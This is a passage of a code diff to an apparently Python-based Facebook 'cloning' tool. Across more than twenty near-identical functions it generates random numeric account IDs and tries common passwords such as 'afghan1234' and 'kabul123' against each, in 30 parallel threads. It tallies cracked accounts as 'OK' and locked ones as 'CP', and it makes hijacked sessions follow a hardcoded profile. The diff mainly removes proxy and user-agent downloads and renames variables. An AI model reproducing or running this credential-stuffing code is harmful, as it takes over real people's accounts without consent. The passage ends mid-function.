@@ -95,23 +95,11 @@ princp=[]
 twf =[]
 user=[]
 ugen=[]
-try:
-    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
-except:
-    pass
-sock=open('ua.html','r').read().splitlines()
 
 loop = 0
 cp = []
 ok = []
 twf = []
-try:
-    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txt').text
-    open('.prox.txt','w').write(prox)
-except Exception as e:
-    print(' WELCOME TO RANDOM CLONING SYSTEM')
-    
-prox=open('.prox.txt','r').read().splitlines()
 agents = [
 
      "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
@@ -341,18 +329,6 @@ except Exception as e:
     print(' WELCOME TO RANDOM CLONING SYSTEM')
     
 prox=open('.prox.txt','r').read().splitlines()
-def uaku():
-    try:
-        ua=open('bbnew.txt','r').read().splitlines()
-        for ub in ua:
-            ugen.append(ub)
-    except:
-        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-        ua=open('.bbnew.txt','w')
-        aa=re.findall('line">(.*?)<',str(a))
-        for un in aa:
-            ua.write(un+'\n') 
-        ua=open('.bbnew.txt','r').read().splitlines()
 
 loop = 0
 cp = []
@@ -360,13 +336,6 @@ ok = []
 twf = []
 
 ugen = []
-try:
-    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txt').text
-    open('.prox.txt','w').write(prox)
-except Exception as e:
-    print(' WELCOME TO RANDOM CLONING SYSTEM')
-    
-prox=open('.prox.txt','r').read().splitlines()
 for xd in range(5000):
     aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
@@ -574,7 +543,7 @@ def cek_apk(session,coki):
             print('\033[1;32m--------------------------------------------------------------') 
 def follow(ses,coki):
     ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/subhanullah.niazay', cookies={'cookie': coki}).text, 'html.parser')
+    r = sop(ses.get('https://mbasic.facebook.com/700004599', cookies={'cookie': coki}).text, 'html.parser')
     get = r.find('a', string='Follow').get('href')
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
@@ -729,7 +698,7 @@ def awm1():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -738,10 +707,10 @@ def awm1():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan12345', 'afghan1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan12345', 'afghan1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -772,7 +741,7 @@ def awm2():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -781,10 +750,10 @@ def awm2():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -813,7 +782,7 @@ def awm3():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -822,10 +791,10 @@ def awm3():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khankhan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khankhan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -854,7 +823,7 @@ def awm5():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -863,10 +832,10 @@ def awm5():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghanistan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghanistan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -895,7 +864,7 @@ def awm4():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -904,10 +873,10 @@ def awm4():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -937,7 +906,7 @@ def awm6():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -946,10 +915,10 @@ def awm6():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'100200']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'100200']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -979,7 +948,7 @@ def awm7():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -988,10 +957,10 @@ def awm7():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'kabul1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'kabul1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1021,7 +990,7 @@ def awm8():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1030,10 +999,10 @@ def awm8():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'kabul123']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'kabul123']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1063,7 +1032,7 @@ def awm9():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1072,10 +1041,10 @@ def awm9():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan123']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan123']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1105,7 +1074,7 @@ def awm10():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1114,10 +1083,10 @@ def awm10():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'1122334455']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'1122334455']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1148,7 +1117,7 @@ def awm11():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1157,10 +1126,10 @@ def awm11():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'1234512345']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'1234512345']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1190,7 +1159,7 @@ def awm12():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1199,10 +1168,10 @@ def awm12():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'786786']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'786786']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1232,7 +1201,7 @@ def awm13():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1241,10 +1210,10 @@ def awm13():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'500600']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'500600']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1274,7 +1243,7 @@ def awm14():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1283,10 +1252,10 @@ def awm14():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'kabul1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'kabul1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1316,7 +1285,7 @@ def awm15():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1325,10 +1294,10 @@ def awm15():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'kabul1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'kabul1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1358,7 +1327,7 @@ def awm16():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1367,10 +1336,10 @@ def awm16():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'kabul123']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'kabul123']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1400,7 +1369,7 @@ def awm17():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1409,10 +1378,10 @@ def awm17():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1442,7 +1411,7 @@ def awm18():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1451,10 +1420,10 @@ def awm18():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan123']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan123']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1484,7 +1453,7 @@ def awm19():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1493,10 +1462,10 @@ def awm19():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghanistan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghanistan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1526,7 +1495,7 @@ def awm20():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1535,10 +1504,10 @@ def awm20():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'afghan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'afghan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1566,7 +1535,7 @@ def awm21():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1575,10 +1544,10 @@ def awm21():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khankhan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khankhan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1606,7 +1575,7 @@ def awm22():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1615,10 +1584,10 @@ def awm22():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khan1234']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khan1234']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1648,7 +1617,7 @@ def awm23():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1657,10 +1626,10 @@ def awm23():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khan123']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khan123']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1689,7 +1658,7 @@ def awm24():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1698,10 +1667,10 @@ def awm24():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'pakistan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'pakistan']
